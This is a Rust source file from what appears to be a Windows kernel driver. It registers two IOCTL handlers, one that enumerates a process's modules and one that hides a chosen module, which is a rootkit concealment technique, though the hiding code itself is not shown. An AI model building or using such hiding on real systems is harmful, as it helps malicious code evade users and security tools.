use {
    alloc::boxed::Box,
    hashbrown::HashMap,
    shared::{ioctls::{IOCTL_ENUMERATE_MODULE, IOCTL_HIDE_MODULE}, structs::{ModuleInfo, TargetProcess, TargetModule}},
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    crate::{handle, module::Module, utils::ioctls::IoctlHandler},
};

/// Registers the IOCTL handlers for module-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the module-related
///   IOCTL handlers will be inserted.
///
pub fn get_module_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Enumerate Modules
    ioctls.insert(IOCTL_ENUMERATE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ENUMERATE_MODULE");
        
        let mut information = 0;
        let status = unsafe { handle!(irp, stack, Module::enumerate_module, TargetProcess, ModuleInfo, &mut information) };
        unsafe { (*irp).IoStatus.Information = information as u64 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Hide Modules
    ioctls.insert(IOCTL_HIDE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_HIDE_MODULE");
        
        let status = unsafe { handle!(stack, Module::hide_module, TargetModule) };
        unsafe { (*irp).IoStatus.Information = 0};
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);
}